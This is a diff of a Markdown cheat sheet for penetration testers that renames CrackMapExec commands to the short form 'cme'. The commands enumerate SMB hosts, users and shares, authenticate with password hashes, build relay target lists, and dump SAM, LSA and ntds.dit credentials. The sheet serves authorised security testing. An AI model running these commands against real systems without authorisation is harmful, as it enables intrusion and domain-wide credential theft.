@@ -1,8 +1,8 @@
-# crackmapexec
+# cme
 
 % windows, smb, enumeration, cme, 445
 
-## crackmapexec - enumerate hosts, network
+## cme - enumerate hosts, network
 
 Exemple : cme smb 192.168.1.0/24
 
@@ -10,94 +10,94 @@ Exemple : cme smb 192.168.1.0/24
 cme smb <ip>
 ```
 
-## crackmapexec - enumerate null session
+## cme - enumerate null session
 ```
-crackmapexec smb <ip> -u '' -p '' --pass-pol
-```
-
-## crackmapexec - enumerate anonymous login
-```
-crackmapexec smb <ip> -u 'a' -p ''
+cme smb <ip> -u '' -p '' --pass-pol
 ```
 
-## crackmapexec - enumerate active sessions
+## cme - enumerate anonymous login
 ```
-crackmapexec smb <ip> -u <user> -p '<password>' --sessions
-```
-
-## crackmapexec - enumerate logged users
-```
-crackmapexec smb <ip> -u <user> -p '<password>' --loggedon-users
+cme smb <ip> -u 'a' -p ''
 ```
 
-## crackmapexec - enumerate domain users
+## cme - enumerate active sessions
 ```
-crackmapexec smb <ip> -u <user> -p '<password>' --users
-```
-
-## crackmapexec - enumerate users by bruteforce the RID
-```
-crackmapexec smb <ip> -u <user> -p '<password>' --rid-brute
+cme smb <ip> -u <user> -p '<password>' --sessions
 ```
 
-## crackmapexec - enumerate domain groups
+## cme - enumerate logged users
 ```
-crackmapexec smb <ip> -u <user> -p '<password>' --groups
-```
-
-## crackmapexec - enumerate local groups
-```
-crackmapexec smb <ip> -u <user> -p '<password>' --local-groups
+cme smb <ip> -u <user> -p '<password>' --loggedon-users
 ```
 
-## crackmapexec - enumerate host with smb signing not required
+## cme - enumerate domain users
 ```
-crackmapexec smb <ip> --gen-relay-list <relaylistOutputFilename>
-```
-
-## crackmapexec - local-auth
-```
-crackmapexec smb <ip> -u <user> -p <password> --local-auth
+cme smb <ip> -u <user> -p '<password>' --users
 ```
 
-## crackmapexec - local-auth with hash
+## cme - enumerate users by bruteforce the RID
 ```
-crackmapexec smb <ip> -u <user> -H <hash> --local-auth
-```
-
-## crackmapexec - domain
-```
-crackmapexec smb <ip> -u <user> -p <password> -d <domain>
+cme smb <ip> -u <user> -p '<password>' --rid-brute
 ```
 
-## crackmapexec - SAM
+## cme - enumerate domain groups
 ```
-crackmapexec smb <ip> -u <user> -p <password> -d <domain> --sam
-```
-
-## crackmapexec - LSA
-```
-crackmapexec smb <ip> -u <user> -p <password> -d <domaine> --lsa
+cme smb <ip> -u <user> -p '<password>' --groups
 ```
 
-## crackmapexec - shares
+## cme - enumerate local groups
 ```
-crackmapexec smb <ip> -u <user> -p <password> -d <domain> --shares
-```
-
-## crackmapexec - enumerate disks
-```
-crackmapexec smb <ip> -u <user> -p '<password>' --disks
+cme smb <ip> -u <user> -p '<password>' --local-groups
 ```
 
-## crackmapexec - ntds.dit
+## cme - enumerate host with smb signing not required
 ```
-crackmapexec smb <ip> -u <user> -p <password> -d <domain> --ntds
+cme smb <ip> --gen-relay-list <relaylistOutputFilename>
 ```
 
-## crackmapexec - ntds.dit history
+## cme - local-auth
 ```
-crackmapexec smb <ip> -u <user> -p <password> -d <domain> --ntds-history
+cme smb <ip> -u <user> -p <password> --local-auth
+```
+
+## cme - local-auth with hash
+```
+cme smb <ip> -u <user> -H <hash> --local-auth
+```
+
+## cme - domain
+```
+cme smb <ip> -u <user> -p <password> -d <domain>
+```
+
+## cme - SAM
+```
+cme smb <ip> -u <user> -p <password> -d <domain> --sam
+```
+
+## cme - LSA
+```
+cme smb <ip> -u <user> -p <password> -d <domaine> --lsa
+```
+
+## cme - shares
+```
+cme smb <ip> -u <user> -p <password> -d <domain> --shares
+```
+
+## cme - enumerate disks
+```
+cme smb <ip> -u <user> -p '<password>' --disks
+```
+
+## cme - ntds.dit
+```
+cme smb <ip> -u <user> -p <password> -d <domain> --ntds
+```
+
+## cme - ntds.dit history
+```
+cme smb <ip> -u <user> -p <password> -d <domain> --ntds-history
 ```
 
 ## crackmap exec - password spray (user=password)
